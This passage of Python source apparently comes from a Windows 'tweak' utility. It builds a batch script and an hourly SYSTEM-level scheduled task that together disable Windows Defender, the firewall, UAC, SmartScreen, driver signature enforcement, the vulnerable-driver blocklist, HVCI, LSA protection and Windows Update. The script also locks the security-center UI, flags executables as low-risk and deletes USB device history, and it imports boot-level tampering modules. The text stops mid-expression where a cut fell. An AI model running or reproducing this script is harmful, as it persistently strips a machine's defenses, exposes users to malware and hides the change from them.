import os
import sys
import time
import ctypes
import config
import get_system_elevate
from uwd import *
import smart_open
import encoding_safety
from EfiGuard import *
from install_wim_tweak import *
from cmd_runner import RunWrapper
from main_imports import (
    b64_to_file,
    b64zip_to_file,
    disable_quick_edit_mode,
    bat_to_reg_reader,
    exit,
    rename_if_user_equals_computer,
    DisableLUA,
    block_all_update,
)


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


def run_as_admin(exe, arg):
    try:
        if is_admin():
            ctypes.windll.shell32.ShellExecuteW(None, "runas", exe, arg, None, 0)
    except:
        return False


try:
    disable_quick_edit_mode()
except:
    pass
try:
    os.chdir(os.path.dirname(sys.executable))
except Exception as e:
    pass


def work(choose, choose2, argvlen=0):
    bat_file = WindowsDir + "\\disable_safety.bat"
    print("正在执行操作 请耐心等待")
    runtask = (
        "schtasks /create /F /tn Microsoft\\Windows\\Zhang\\Disable_Safe /ru"
        + " "
        + chr(34)
        + "SYSTEM"
        + chr(34)
        + " "
        + "/RL HIGHEST /SC HOURLY /mo 1 /TR"
        + " "
        + '"cmd /c '
        + bat_file
        + '"'
    )
    bat_w = (
        "@echo off"
        + chr(10)
        + 'cd /d "%~dp0"'
        + chr(10)
        + "reg add HKEY_CURRENT_USER\\Console /v QuickEdit /t REG_DWORD /d 00000000 /f"
        + chr(10)
        + "NetSh Advfirewall set allprofiles state off"
        + chr(10)
        + (
            "bcdedit /set hypervisorlaunchtype off"
            if choose2 == 1
            else "bcdedit /set hypervisorlaunchtype auto"
        )
        + chr(10)
        + (
            "bcdedit /set nointegritychecks on"
            if choose == 1
            else "bcdedit /set nointegritychecks off"
        )
        + chr(10)
        + (
            "bcdedit /set testsigning on"
            if choose == 1
            else "bcdedit /set testsigning off"
        )
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager" /t REG_SZ /v BootExecute /d "" /f'
        + chr(10)
        + "CHKNTFS/T:0"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Config /t REG_DWORD /v MaxPosPhaseCorrection /d 0xFFFFFFFF /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\Config /t REG_DWORD /v MaxNegPhaseCorrection /d 0xFFFFFFFF /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v UpdateServiceUrlAlternate /t REG_SZ /d 127.0.0.1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUServer /t REG_SZ /d 127.0.0.1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v WUStatusServer /t REG_SZ /d 127.0.0.1 /f"
        + chr(10)
        + "sc stop wuauserv"
        + chr(10)
        + "sc config wuauserv start= disabled"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\wuauserv /t REG_DWORD /v Start /d 4 /f"
        + chr(10)
        + "sc stop UsoSvc"
        + chr(10)
        + "sc config UsoSvc start= disabled"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc /t REG_DWORD /v Start /d 4 /f"
        + chr(10)
        + "sc stop WaaSMedicSvc"
        + chr(10)
        + "sc config WaaSMedicSvc start= disabled"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc /t REG_DWORD /v Start /d 4 /f"
        + chr(10)
        + "sc stop BITS"
        + chr(10)
        + "sc config BITS start= disabled"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\BITS /t REG_DWORD /v Start /d 4 /f"
        + chr(10)
        + "sc stop DoSvc"
        + chr(10)
        + "sc config DoSvc start= disabled"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DoSvc /t REG_DWORD /v Start /d 4 /f"
        + chr(10)
        + "sc stop InstallService"
        + chr(10)
        + "sc config InstallService start= disabled"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\InstallService /t REG_DWORD /v Start /d 4 /f"
        + chr(10)
        + "sc stop edgeupdate"
        + chr(10)
        + "sc config edgeupdate start= disabled"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\edgeupdate /t REG_DWORD /v Start /d 4 /f"
        + chr(10)
        + "sc stop edgeupdatem"
        + chr(10)
        + "sc config edgeupdatem start= disabled"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\edgeupdatem /t REG_DWORD /v Start /d 4 /f"
        + chr(10)
        + "sc stop DiagTrack"
        + chr(10)
        + "sc config DiagTrack start= disabled"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\DiagTrack /t REG_DWORD /v Start /d 4 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoUpdate /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AUOptions /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v DisableOSUpgrade /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate /v DisableWindowsUpdateAccess /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\DeliveryOptimization /v DODownloadMode /t REG_DWORD /d 0 /f"
        + chr(10)
        + 'schtasks /change /tn "\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan" /disable'
        + chr(10)
        + 'schtasks /change /tn "\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Retry Scan" /disable'
        + chr(10)
        + 'schtasks /change /tn "\\Microsoft\\Windows\\UpdateOrchestrator\\USO_UxBroker" /disable'
        + chr(10)
        + 'schtasks /change /tn "\\Microsoft\\Windows\\WindowsUpdate\\Scheduled Start" /disable'
        + chr(10)
        + 'schtasks /change /tn "\\Microsoft\\Windows\\WindowsUpdate\\sih" /disable'
        + chr(10)
        + 'schtasks /change /tn "\\Microsoft\\Windows\\WaaSMedic\\PerformRemediation" /disable'
        + chr(10)
        + 'schtasks /change /tn "\\Microsoft\\Windows\\InstallService\\ScanForUpdates" /disable'
        + chr(10)
        + 'schtasks /change /tn "\\Microsoft\\Windows\\InstallService\\SmartRetry" /disable'
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsUpdate\\UX\\Settings /t reg_sz /v PauseFeatureUpdatesStartTime /d "
        + chr(34)
        + "1970-01-01T08:00:00Z"
        + chr(34)
        + " /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsUpdate\\UX\\Settings /t reg_sz /v PauseQualityUpdatesStartTime /d "
        + chr(34)
        + "1970-01-01T08:00:00Z"
        + chr(34)
        + " /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsUpdate\\UX\\Settings /t reg_sz /v PauseUpdatesExpiryTime /d "
        + chr(34)
        + "3000-01-01T00:00:00Z"
        + chr(34)
        + " /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsUpdate\\UX\\Settings /t reg_sz /v PauseFeatureUpdatesEndTime /d "
        + chr(34)
        + "3000-01-01T00:00:00Z"
        + chr(34)
        + " /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsUpdate\\UX\\Settings /t reg_sz /v PauseQualityUpdatesEndTime /d "
        + chr(34)
        + "3000-01-01T00:00:00Z"
        + chr(34)
        + " /f"
        + chr(10)
        + 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Office\\16.0\\Common\\OfficeUpdate" /f'
        + chr(10)
        + 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Office\\16.0\\Common\\OfficeUpdate" /v EnableAutomaticUpdates /t REG_DWORD /d 0 /f'
        + chr(10)
        + 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Office\\16.0\\Common\\OfficeUpdate" /v HideUpdateNotifications /t REG_DWORD /d 1 /f'
        + chr(10)
        + 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Office\\16.0\\Common\\OfficeUpdate" /v HideEnableDisableUpdates /t REG_DWORD /d 1 /f'
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WindowsUpdate\\UX\\Settings /t reg_dword /v FlightSettingsMaxPauseDays /d 65535 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v UseWUServer /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAutoUpdate /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAUShutdownOption /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v NoAUAsDefaultShutdownOption /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU /v AutoInstallMinorUpdates /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios /t reg_dword /v HypervisorEnforcedCodeIntegrity /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config /t reg_dword /v VulnerableDriverBlocklistEnable /d 0 /f"
        + chr(10)
        + f"reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorUser /t REG_DWORD /d 3 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableVirtualization /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableInstallerDetection /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ValidateAdminCodeSignatures /t REG_DWORD /d 0 /f"
        + chr(10)
        + "powershell -command \" (gci 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Power\\PowerSettings' -Recurse).Name -notmatch '\\bDefaultPowerSchemeValues|(\\[0-9]|\\b255)$' | % {sp $_.Replace('HKEY_LOCAL_MACHINE','HKLM:') -Name 'Attributes' -Value 2 -Force}\""
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications" /t REG_DWORD /v DisableNotifications /d 1 /f'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications" /t REG_DWORD /v DisableEnhancedNotifications /d 1 /f'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Systray" /t REG_DWORD /v HideSystray /d 1 /f'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device security" /t REG_DWORD /v DisableClearTpmButton /d 1 /f'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device security" /t REG_DWORD /v DisableTpmFirmwareUpdateWarning /d 1 /f'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device security" /t REG_DWORD /v HideTPMTroubleshooting /d 1 /f'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device security" /t REG_DWORD /v DisableEnhancedNotifications /d 1 /f'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Account protection" /t REG_DWORD /v UILockdown /d 1 /f'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection" /t REG_DWORD /v UILockdown /d 1 /f'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device performance and health" /t REG_DWORD /v UILockdown /d 1 /f'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Family options" /t REG_DWORD /v UILockdown /d 1 /f'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Device security" /t REG_DWORD /v UILockdown /d 1 /f'
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Policy"
        + chr(34)
        + " /v VerifiedAndReputablePolicyState /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\HypervisorEnforcedCodeIntegrity"
        + chr(34)
        + " /v Enabled /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard\\Scenarios\\KernelShadowStacks"
        + chr(34)
        + " /v Enabled /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend"
        + chr(34)
        + " /v Start /t REG_DWORD /d 4 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SYSTEM\\CurrentControlSet\\Services\\WdNisSvc"
        + chr(34)
        + " /v Start /t REG_DWORD /d 4 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SYSTEM\\CurrentControlSet\\Services\\SecurityHealthService"
        + chr(34)
        + " /v Start /t REG_DWORD /d 4 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SYSTEM\\CurrentControlSet\\Services\\wscsvc"
        + chr(34)
        + " /v Start /t REG_DWORD /d 4 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"
        + chr(34)
        + " /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"
        + chr(34)
        + " /v DisableAntiVirus /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender"
        + chr(34)
        + " /v PUAProtection /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"
        + chr(34)
        + " /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"
        + chr(34)
        + " /v DisableIOAVProtection /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"
        + chr(34)
        + " /v DisableOnAccessProtection /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection"
        + chr(34)
        + " /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Scan"
        + chr(34)
        + " /v ScanScheduleDay /t REG_DWORD /d 8 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Scan"
        + chr(34)
        + " /v DisableRemovableDriveScanning /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Scan"
        + chr(34)
        + " /v DisableScanningNetworkFiles /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Scan"
        + chr(34)
        + " /v DisableScanningMappedNetworkDrivesForFullScan /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Scan"
        + chr(34)
        + " /v DisableCatchupQuickScan /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Scan"
        + chr(34)
        + " /v DisableCatchupFullScan /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\NIS"
        + chr(34)
        + " /v DisableNIS /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet"
        + chr(34)
        + " /v MAPSReporting /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Spynet"
        + chr(34)
        + " /v SubmitSamplesConsent /t REG_DWORD /d 2 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Reporting"
        + chr(34)
        + " /v DisableGenericRePORTs /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Network Protection"
        + chr(34)
        + " /v EnableNetworkProtection /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\Controlled Folder Access"
        + chr(34)
        + " /v EnableControlledFolderAccess /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\ASR"
        + chr(34)
        + " /v ExploitGuard_ASR_Rules /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"
        + chr(34)
        + " /v HideSCAHealth /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer"
        + chr(34)
        + " /v SmartScreenEnabled /t REG_SZ /d "
        + chr(34)
        + "Off"
        + chr(34)
        + " /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\AppHost"
        + chr(34)
        + " /v EnableWebContentEvaluation /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Edge"
        + chr(34)
        + " /v SmartScreenEnabled /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Edge"
        + chr(34)
        + " /v SmartScreenPuaEnabled /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Edge"
        + chr(34)
        + " /v SmartScreenForTrustedDownloadsEnabled /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\Edge"
        + chr(34)
        + " /v SmartScreenDnsRequestsEnabled /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile"
        + chr(34)
        + " /v EnableFirewall /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile"
        + chr(34)
        + " /v EnableFirewall /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile"
        + chr(34)
        + " /v EnableFirewall /t REG_DWORD /d 0 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\DomainProfile"
        + chr(34)
        + " /v DisableNotifications /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\StandardProfile"
        + chr(34)
        + " /v DisableNotifications /t REG_DWORD /d 1 /f"
        + chr(10)
        + "reg add "
        + chr(34)
        + "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsFirewall\\PublicProfile"
        + chr(34)
        + " /v DisableNotifications /t REG_DWORD /d 1 /f"
        + chr(10)
        + "assoc .bat=batfile"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v RunAsPPL /d 0 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v RunAsPPLBoot /d 0 /f"
        + chr(10)
        + chr(10)
        + "for /f \"tokens=1 delims= \" %%i in ('reg query HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f edge') do (reg delete HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v %%i /f)"
        + chr(10)
        + "for /f \"tokens=1 delims= \" %%i in ('reg query HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /f edge') do (reg delete HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v %%i /f)"
        + chr(10)
        + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ACE-Tray /f"
        + chr(10)
        + "reg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v ACE-Tray /f"
        + chr(10)
        + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth /f"
        + chr(10)
        + "reg delete HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityHealth /f"
        + chr(10)
        + "reg delete HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Edge /f"
        + chr(10)
        + "reg delete HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Edge /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\MicrosoftEdgeElevationService /t REG_DWORD /v Start /d 4 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\edgeupdatem /t REG_DWORD /v Start /d 4 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\edgeupdate /t REG_DWORD /v Start /d 4 /f"
        + chr(10)
        + 'for /f "tokens=1 delims=," %%i in (\'schtasks /query /fo csv\') do (echo %%i | findstr "Edge OneDrive" && schtasks /change /disable /tn %%i)'
        + chr(10)
        + 'for /f "tokens=1 delims=," %%i in (\'schtasks /query /fo csv\') do (echo %%i | findstr "Edge OneDrive" && for /f "tokens=9 delims=," %%j in (\'schtasks /Query /TN %%i /V /fo csv /NH\') do (for /f "delims=/" %%k in (\'echo %%~j\') do (del /f /q "%%k" & echo "%%k" > "%%k" & attrib +r "%%k" & icacls "%%k" /setowner SYSTEM /T /C & icacls "%%k" /inheritance:r /deny Everyone:F /T /C)))'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Firewall and network protection" /t REG_DWORD /v UILockdown /d 1 /f'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Virus and threat protection" /t REG_DWORD /v UILockdown /d 0 /f'
        + chr(10)
        + "reg delete HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Enum\\USBSTOR /f"
        + chr(10)
        + 'sc stop "SysMain" & sc config "SysMain" start=disabled'
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\System /t REG_DWORD /v EnableSmartScreen /d 0 /f"
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /t REG_DWORD /v DisableRealtimeMonitoring /d 1 /f'
        + chr(10)
        + 'reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /t REG_DWORD /v DisableNotifications /d 1 /f'
        + chr(10)
        + 'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /t REG_DWORD /v DisableAntiSpyware /d 1 /f'
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoAutorun /d 1 /f"
        + chr(10)
        + 'reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations /t REG_SZ /v LowRiskFileTypes /d ".avi;.bat;.cmd;.exe;.htm;.html;.lnk;.mpg;.mpeg;.mov;.mp3;.mp4;.mkv;.msi;.m3u;.rar;.reg;.txt;.vbs;.wav;.zip;.7z;.rar;.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.PY;.PYW" /f'
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Attachments /t REG_DWORD /v ScanWithAntiVirus /d 1 /f"
        + chr(10)
        + "reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /t REG_DWORD /v NoAutorun /d 1 /f"
        + chr(10)
        + 'reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Associations /t REG_SZ /v LowRiskFileTypes /d ".avi;.bat;.cmd;.exe;.htm;.html;.lnk;.mpg;.mpeg;.mov;.mp3;.mp4;.mkv;.msi;.m3u;.rar;.reg;.txt;.vbs;.wav;.zip;.7z;.rar;.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.PY;.PYW" /f'
        + chr(10)
